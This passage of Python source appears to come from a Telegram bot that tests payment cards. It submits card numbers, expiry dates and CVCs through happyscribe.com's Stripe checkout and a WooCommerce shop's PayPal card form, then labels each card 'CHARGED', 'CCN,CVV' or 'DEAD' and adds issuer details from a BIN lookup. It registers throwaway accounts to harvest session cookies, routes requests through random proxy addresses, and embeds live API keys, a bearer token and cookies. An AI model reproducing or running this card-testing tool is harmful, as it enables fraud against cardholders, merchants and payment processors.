        elif any(keyword in res.text for keyword in ["Your card's security code is incorrect.", "security code is invalid", "incorrect_cvc", "security code is incorrect", "Card Issuer Declined CVV", "Your card zip code is incorrect.", "card's security code is incorrect"]):
            stay = 'CCN,CVV ♻️'
            try:
                kill = res.json()['warning']
            except:
            	kill = ""
        elif any(keyword in res.text for keyword in ["Declined - Call Issuer", "Declinedll Issuer", "Your card was declined.", "Your card has expired", "risk_threshold", "Error Processing Payment", "Your card number is incorrect."]):
            stay = 'DEAD ❌'
            try:
                kill = res.json()['warning']
            except:
            	kill = ""
        else:
            stay = 'DEAD ❌'
            GetCookiesStripCh()
            try:
                kill = res.json()['warning']
            except:
            	kill = ""
            
            
        
        try:
            meet_headers = {
                'Referer': 'https://bincheck.io/ar',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
            response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            table1 = soup.find('table', class_='w-full table-auto')
            rows1 = table1.find_all('tr')
            table2 = soup.find_all('table', class_='w-full table-auto')[1]
            rows2 = table2.find_all('tr')

            bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
            for row in rows1:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'BIN/IIN':
                        bin_ = cell2_text
                    elif cell1_text == 'العلامة التجارية للبطاقة':
                        brand = cell2_text
                    elif cell1_text == 'نوع البطاقة':
                        card_type = cell2_text
                    elif cell1_text == 'تصنيف البطاقة':
                        card_level = cell2_text
                    elif cell1_text == 'اسم المصدر / البنك':
                        bank = cell2_text
                    elif cell1_text == 'المُصدِر / هاتف البنك':
                        bank_phone = cell2_text

            country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
            for row in rows2:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'اسم الدولة ISO':
                        country_name = cell2_text
                    elif cell1_text == 'رمز البلد ISO A2':
                        country_iso_a2 = cell2_text
                    elif cell1_text == 'ISO كود الدولة A3':
                        country_iso_a3 = cell2_text
                    elif cell1_text == 'علم الدولة':
                        country_flag = cells[1].find('img')['src']
                    elif cell1_text == 'عملة البلد ISO':
                        currency = cell2_text

            try:
                country = pycountry.countries.get(name=country_name)
                flag = country.flag if country else ""
            except:
                
                flag = ""

            end_time = time.time()
            duration = int(end_time - start_time)

            msg = f"""
𝐒𝐭𝐫𝐢𝐩 𝐂𝐡𝐫𝐚𝐠𝐞⇾ 💱
𝐂𝐚𝐫𝐝 ⇾ {P}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {stay}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {kill}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]}
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
            bot.delete_message(message.chat.id, kg.message_id)
            bot.reply_to(message, msg)
        except Exception as e:
            bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")    
    except Exception as e:
        bot.reply_to(message, f"𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
        GetCookiesStripCh()
            
        

def GetStripCok():
    bb = 'qwaszxcerdfvbtyghnmjkluiop0987654321'
    hell = ''.join(random.choice(bb) for i in range(14))
    domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
    email = hell + domin

    with requests.Session() as session:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.happyscribe.com',
            'Referer': 'https://www.happyscribe.com/users/sign_up',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'authenticity_token': 'Ha2PyqJMB86XhLGsEIXW5DqF4ZD9dHHopNfE1D1GgNUKpzWDEMSkIoqN_7WuhwpBOr6hr8obLyEUj-OhsWGLMw',
            'next': '',
            'user[currency]': 'usd',
            'user[email]': email,
            'button': '',
        }
        try:
            rr = session.post('https://www.happyscribe.com/users', headers=headers, data=data).text
            cookies = session.cookies.get_dict()
            try:
                os.remove('Charge_coki.txt')
            except:
                pass

            with open('Charge_coki.txt', 'a') as f:
                f.write(str(cookies) + '\n')
        except:
            GetStripCok()
            
        

def StripCharge(message, user_type):
    try:
        kg = bot.reply_to(message, f'<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
        time.sleep(10)

        if '.sr' in message.text:
            P = message.text.split('.sr')[1].strip()
        elif '/sr' in message.text:
            P = message.text.split('/sr')[1].strip()

        n, mm, yy, cvc = map(str.strip, P.split("|"))
        if yy.startswith('20'):
            yy = yy.split('20')[1]

        try:
            with open("Charge_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            GetStripCok()
            with open("Charge_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        start_time = time.time()
        url = 'https://api.stripe.com/v1/payment_methods'
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': generate_user_agent(),
        }

        data = f'type=card&billing_details[name]=Ufx&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=acf10946-6020-4817-a592-a044c033098415103f&sid=eb1736cd-ed50-4bb8-8720-9b957efdf4964b7b42&pasted_fields=number&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=190912&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'

        response = requests.post(url, headers=headers, data=data)
        if 'pm' in response.text:
            id = response.json()['id']
        else:
            id = None

        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        headers = {
            'authority': 'www.happyscribe.com',
            'accept': 'application/json',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en;q=0.7,en-US;q=0.6',
            'authorization': 'Bearer JdRqSPiecb8mlzv62STXvwtt',
            'content-type': 'application/json',
            'origin': 'https://www.happyscribe.com',
            'referer': 'https://www.happyscribe.com/v2/9810677/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'id': 9489749,
            'address': 'mahos-tool73',
            'name': 'Ufx',
            'country': 'US',
            'vat': None,
            'billing_account_id': 9489749,
            'orderReference': 'jgzrqzti',
            'user_id': 10206055,
            'organization_id': 9810677,
            'hours': 0,
            'balance_increase_in_cents': None,
            'payment_method_id': id,
            'transcription_id': None,
            'plan': 'basic_2023_05_01',
            'order_id': None,
            'recurrence_interval': 'month',
            'extra_plan_hours': None,
        }

        res = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data, proxies={'http': proxy})

        if any(keyword in res.text for keyword in ["live", "success", "Your card has insufficient funds", "insufficient funds", "Payment success", "Thank you for your support.", "insufficient_funds", "card has insufficient funds", "successfully", "Your card does not support this type of purchase.", "payment-successfully"]):
            stay = 'CHARGED ✅'
            try:
                kill = res.json()['error']
            except:
            	kill = ""
        elif any(keyword in res.text for keyword in ["Your card's security code is incorrect.", "security code is invalid", "incorrect_cvc", "security code is incorrect", "Card Issuer Declined CVV", "Your card zip code is incorrect.", "card's security code is incorrect"]):
            stay = 'CCN,CVV ♻️'
            try:
                kill = res.json()['error']
            except:
            	kill = ""
        elif any(keyword in res.text for keyword in ["Declined - Call Issuer", "Declinedll Issuer", "Your card was declined.", "Your card has expired", "risk_threshold", "Error Processing Payment", "Your card number is incorrect."]):
            stay = 'DEAD ❌'
            try:
                kill = res.json()['error']
            except:
            	kill = ""
        else:
            stay = 'DEAD ❌'
            try:
                kill = res.json()['error']
            except:
            	kill = ""
            GetStripCok()

        

        try:
            meet_headers = {
                'Referer': 'https://bincheck.io/ar',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
            response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            table1 = soup.find('table', class_='w-full table-auto')
            rows1 = table1.find_all('tr')
            table2 = soup.find_all('table', class_='w-full table-auto')[1]
            rows2 = table2.find_all('tr')

            bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
            for row in rows1:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'BIN/IIN':
                        bin_ = cell2_text
                    elif cell1_text == 'العلامة التجارية للبطاقة':
                        brand = cell2_text
                    elif cell1_text == 'نوع البطاقة':
                        card_type = cell2_text
                    elif cell1_text == 'تصنيف البطاقة':
                        card_level = cell2_text
                    elif cell1_text == 'اسم المصدر / البنك':
                        bank = cell2_text
                    elif cell1_text == 'المُصدِر / هاتف البنك':
                        bank_phone = cell2_text

            country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
            for row in rows2:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'اسم الدولة ISO':
                        country_name = cell2_text
                    elif cell1_text == 'رمز البلد ISO A2':
                        country_iso_a2 = cell2_text
                    elif cell1_text == 'ISO كود الدولة A3':
                        country_iso_a3 = cell2_text
                    elif cell1_text == 'علم الدولة':
                        country_flag = cells[1].find('img')['src']
                    elif cell1_text == 'عملة البلد ISO':
                        currency = cell2_text

            try:
                country = pycountry.countries.get(name=country_name)
                flag = country.flag if country else ""
            except:
                
                flag = ""

            end_time = time.time()
            duration = int(end_time - start_time)

            msg = f"""
𝐒𝐭𝐫𝐢𝐩 𝐂𝐡𝐫𝐚𝐠𝐞⇾ 💱
𝐂𝐚𝐫𝐝 ⇾ {P}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {stay}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {kill}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]}
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
            bot.delete_message(message.chat.id, kg.message_id)
            bot.reply_to(message, msg)
        except Exception as e:
            bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
    except Exception as e:
        bot.reply_to(message, f"𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
        GetStripCok()

def GetPay():
    try:
        uid1 = uuid.uuid4().hex
        uid2 = uuid.uuid4().hex
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        sessionID = f"uid_{uid1[:12]}_mdk6mta6nda"
        buttonSessionID = f"uid_{uid2[:12]}_mdk6mta6nda"
        

        cookies = {
    'tk_ai': 'ok3dAdj1lAp5AEtlZoF%2FFOuQ',
    'woolentor_viewed_products_list': 'a%3A1%3A%7Bi%3A1716541792%3Bi%3A8865%3B%7D',
    'woodmart_cookies_1': 'accepted',
    'wp_woocs_session_7ac7dabb2243a679675694fca28047bb': 't_fe0c9bae41c487623729d6dc3b1bfe%7C%7C1716913752%7C%7C1716910152%7C%7C9bf9dd29044fd2ede766b5e735b54e97',
    'wp_woocommerce_session_7ac7dabb2243a679675694fca28047bb': 't_eda169999f2cb44b0aecd59465c342%7C%7C1716913861%7C%7C1716910261%7C%7Cecbfe73250a72ba59dd176c9bc63489c',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'fd10ed0aafb32227a88094ff809ca9ec',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-05-27%2014%3A26%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fcha7n.com%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-05-27%2014%3A26%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fcha7n.com%2Fcheckout%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcha7n.com%2Fcheckout%2F',
    'tk_qs': '',
}
        headers = {
    'Accept': '*/*',
    'Accept-Language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    
    'Origin': 'https://cha7n.com',
    'Referer': 'https://cha7n.com/checkout/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

        params = {
    'wc-ajax': 'ppc-create-order',
}

        json_data = {
    'nonce': 'c6ec283eec',
    'payer': None,
    'bn_code': 'Woo_PPCP',
    'context': 'checkout',
    'order_id': '0',
    'payment_method': 'ppcp-gateway',
    'funding_source': 'card',
    'form_encoded': 'billing_first_name=Ahmed&billing_last_name=Mahos&billing_email=hqzt8vjub%40waterisgone.com&billing_phone=5012346981&billing_country=DZ&account_username=jsjsjsjs&account_password=isisisu88&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fcha7n.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-05-27+14%3A26%3A31&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F116.0.0.0+Mobile+Safari%2F537.36&cart%5B2b45f1a6ea1f89d16cc2d6e1b85fa4c6%5D%5Bqty%5D=1&_wpnonce=86baa81e10&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=6715b783c8&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
    'createaccount': False,
    'save_payment_method': False,
}

        req = requests.post('https://cha7n.com/', params=params, cookies=cookies, headers=headers, json=json_data).json()

        id = req['data']['id']

        try:
            os.remove('PayPal.txt')
        except:
            pass

        with open('PayPal.txt', 'a') as t:
            t.write(f"{id}|{sessionID}|{buttonSessionID}\n")

    except Exception as e:
        print(e)
        try:
            mazen = '5023850793'
            bot.send_message(mazen, f"حدث بوابه البايبال ي مازن")
        except:
        	pass
        
        


def Paypal(message, user_type):
    kg = bot.reply_to(message, '<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
    time.sleep(10)

    if '.pay' in message.text:
        P = message.text.split('.pay')[1].strip()
    elif '/pay' in message.text:
        P = message.text.split('/pay')[1].strip()

    n, mm, yy, cvc = map(str.strip, P.split("|"))
    if not yy.startswith('20'):
        yy = '20' + yy

    try:
        with open("PayPal.txt", "r") as f:
            for line in f:
                id = line.strip().split('|')[0]
                sessionID = line.strip().split('|')[1]
                buttonSessionID = line.strip().split('|')[2]
    except:
        GetPay()
        with open("PayPal.txt", "r") as f:
            for line in f:
                id = line.strip().split('|')[0]
                sessionID = line.strip().split('|')[1]
                buttonSessionID = line.strip().split('|')[2]
    start_time = time.time()
    cookies = {
    'enforce_policy': 'ccpa',
    'cookie_check': 'yes',
    'd_id': '56c19d1972034329b8590289d18698241716509565704',
    'l7_az': 'dcg15.slc',
    'ts_c': 'vr%3Da3ab998d18f0aa381056d2adfe4aaa5a%26vt%3Da9ddf39318f0aa3828a75895ffe4e2fb',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'MlfcxeXsgypEM0Hi2qu9F-GcvpjVs-6rmdIBt2bF8nmh1sCo7wBI1K9q5wQ3b6h2l50FNuPQs6WjwFV4',
    'sc_f': 'KyaY0yEqm9zlxxI7pChUOmGu_2AkHig6Mzap-P8R_pwuu3CmOPFaaH7qXxOMk20833CUrdhCaQ6hY4KVTQS14VjyJdoeZSt0jOVeqG',
    'rssk': 'd%7DC9%4079%3A959B%3C%3B%406%3Exqx%3Erv%3Bju%7Dvk%3F17',
    'nsid': 's%3A_6vzKWh9UIwk4AnU-8LSsx4pfoaSrea9.bh%2F8wENUtcImxzuQ1ahFijVqm6518DpfoNrP3vqaksc',
    'LANG': 'en_US%3BUS',
    'x-pp-s': 'eyJ0IjoiMTcxNjU0MTk4NDY1NCIsImwiOiIwIiwibSI6IjAifQ',
    'tsrce': 'graphqlnodeweb',
    'ts': 'vreXpYrS%3D1811149984%26vteXpYrS%3D1716543784%26vr%3Da3ab998d18f0aa381056d2adfe4aaa5a%26vt%3Da9ddf39318f0aa3828a75895ffe4e2fb%26vtyp%3Dreturn',
}

    headers = {
        'authority': 'www.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'paypal-client-context': id,
        'paypal-client-metadata-id': id,
        'referer': f'https://www.paypal.com/smart/card-fields?sessionID={sessionID}&buttonSessionID={buttonSessionID}&locale.x=ar_DZ&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJ6c3N1Q25fXzJhYTR0cV9DSDBEcjJxekhIN1dBZ28yaUZfU202LWt3QlN4OFhFOHBXWnN3YnNsMXRIcFk5dWt5ZHIweTAtbE91a0NzZmEmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wNC0yMiZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxidXR0b25zJnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyJmxvY2FsZT1hcl9EWiIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfeWN0eGdpc2FwaHBiemZ2cGt3aGp2dGZwenBzaWxsIn19&disable-card=&token={id}',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-app-name': 'standardcardfields',
        'x-country': 'US',
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': id,
            'card': {
                'cardNumber': n,
                'expirationDate': f'{mm}/{yy}',
                'postalCode': '10001',
                'securityCode': cvc,
            },
            'firstName': 'Ahmed',
            'lastName': 'mahos',
            'billingAddress': {
                'givenName': 'Ahmed',
                'familyName': 'mahos',
                'line1': None,
                'line2': None,
                'city': None,
                'state': None,
                'postalCode': '10001',
                'country': 'US',
            },
            'email': 'hqzt8vjub@waterisgone.com',
            'currencyConversionType': 'PAYPAL',
        },
        'operationName': None,
    }

    req = requests.post(
        'https://www.paypal.com/graphql?fetch_credit_form_submit',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    if 'INVALID_RESOURCE_ID' in req.text:
        GetPay()
    else:
        for error in req.json().get('errors', []):
            try:
                fil = error['data'][0]['field']
            except:
                fil = ""
            try:
                code = error['data'][0]['code']
            except:
                code = ""
            try:
                gg = error['message']
            except:
                gg = ""
            try:
                meet_headers = {
                    'Referer': 'https://bincheck.io/ar',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }
                response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
                soup = BeautifulSoup(response.text, 'html.parser')
                table1 = soup.find('table', class_='w-full table-auto')
                rows1 = table1.find_all('tr')
                table2 = soup.find_all('table', class_='w-full table-auto')[1]
                rows2 = table2.find_all('tr')

                bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
                for row in rows1:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'BIN/IIN':
                            bin_ = cell2_text
                        elif cell1_text == 'العلامة التجارية للبطاقة':
                            brand = cell2_text
                        elif cell1_text == 'نوع البطاقة':
                            card_type = cell2_text
                        elif cell1_text == 'تصنيف البطاقة':
                            card_level = cell2_text
                        elif cell1_text == 'اسم المصدر / البنك':
                            bank = cell2_text
                        elif cell1_text == 'المُصدِر / هاتف البنك':
                            bank_phone = cell2_text

                country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
                for row in rows2:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'اسم الدولة ISO':
                            country_name = cell2_text
                        elif cell1_text == 'رمز البلد ISO A2':
                            country_iso_a2 = cell2_text
                        elif cell1_text == 'ISO كود الدولة A3':
                            country_iso_a3 = cell2_text
                        elif cell1_text == 'علم الدولة':
                            country_flag = cells[1].find('img')['src']
                        elif cell1_text == 'عملة البلد ISO':
                            currency = cell2_text

                try:
                    country = pycountry.countries.get(name=country_name)
                    flag = country.flag if country else ""
                except:
                    flag = ""
                end_time = time.time()
                duration = int(end_time - start_time)

                msg = f"""
𝐒𝐭𝐫𝐢𝐩 𝐀𝐮𝐭𝐡𝟏 ⇾ 💱
𝐂𝐚𝐫𝐝 ⇾ {P}             
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {fil}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {gg} - {code}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
                bot.delete_message(message.chat.id, kg.message_id)
                bot.reply_to(message, msg)
            except:
                bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
    


def getting_cookies_strip1():
    try:
        fer = faker.first_name()
        lat = faker.first_name()
        no = faker.first_name().upper()
        mo = faker.first_name().upper()
        name = f"{no} {mo}"
        psw = faker.password()
        hell = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(17))
        domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
        email = hell + domin
        eq = "https://www.lagreeod.com/subscribe"
        hh = requests.get(eq, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}).cookies['ci_session']
        cookies = {'ci_session': hh}
        hd = {
            'authority': 'www.lagreeod.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
